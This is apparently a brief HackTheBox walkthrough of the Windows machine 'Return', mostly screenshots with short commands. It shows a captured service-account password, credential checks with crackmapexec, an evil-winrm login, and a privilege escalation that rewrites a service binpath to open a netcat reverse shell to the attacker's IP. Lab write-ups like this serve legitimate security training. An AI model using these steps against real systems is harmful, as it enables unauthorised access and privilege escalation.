### 29-Jan-24-Mon

[Return](https://app.hackthebox.com/machines/Return)

*Windows · Easy*

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/db1dc948-748d-46eb-bcbb-4071dbd049a2)

http://10.129.56.33/

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/38df98cc-b1ee-443b-949a-4eca05e721bc)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a12e0d2e-02fb-4e5e-8b58-a5c716c94946)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/12f535ee-2532-4da0-b54c-5488c69dc467)

| Server Address | printer.return.local |
| --- | ---|
| Server Port | 389 |
| Username | svc-printer |
| Password | ******* |

```
Passw0rd!
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/0c8fe4e1-0f2f-42f3-adbb-39e4d1fdffd8)

```
echo '10.129.56.33 printer.return.local' | tee -a /etc/hosts
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2f7d3fb6-6137-48ca-891d-8b94d8fc0ff1)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/628decd2-64d8-487f-9304-c298a4fecb9e)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2a1be086-1321-4b28-b450-b1767aeba9f4)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ebd8af79-d346-491c-829e-250f7c5b38d7)

```
1edFg43012!!
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/7229364c-8a72-4ac6-be97-8349c5ae30e8)

```
crackmapexec smb 10.129.56.33 -u svc-printer -p '1edFg43012!!'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/425309e0-7c00-4aa6-8832-78d936729879)

```
evil-winrm -i 10.129.56.33 -u svc-printer -p '1edFg43012!!'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2be96468-b20b-40b2-b1d5-ba09b545c227)

```
0e065aab885ce6496268c48203c6f884
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d6ab6746-2c9d-4a8b-907f-a4fb166fcf80)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b1820b68-fd30-432b-8fc4-14cdd62b061f)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/31a43705-f2a4-4b48-bdf9-662d176ebf37)

```
net user svc-printer
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ad779d2f-8c3d-4737-960b-2739972f4617)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1f650c70-8d8b-4198-af61-c6d1d424e85f)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/683a5ac9-1ba3-4a0d-be22-0dfaf1bd365b)

```
services
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/d8c2cc4d-0f51-42a7-a89a-57690274f438)

```
get-service vss
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a3c5f638-991c-4f93-a049-75491c24a158)

```
sc.exe config vss binpath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.8 443"
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/fb5d69fb-1bb1-4a91-b29c-5767c5d02404)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/932a9435-8eec-4665-af9b-0fceefb0d8c0)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/1f4cfa40-8351-409a-9a11-4a42903fae3e)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b7f78aae-2f3b-4693-a673-a9d620dc619f)

```
8f5bec8aa949128ac0c6c209d2cdd9b6
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/01830da7-c230-4428-bf7f-9ac04031a48e)

Walkthrough by https://youtu.be/QPeWiL2N8xc
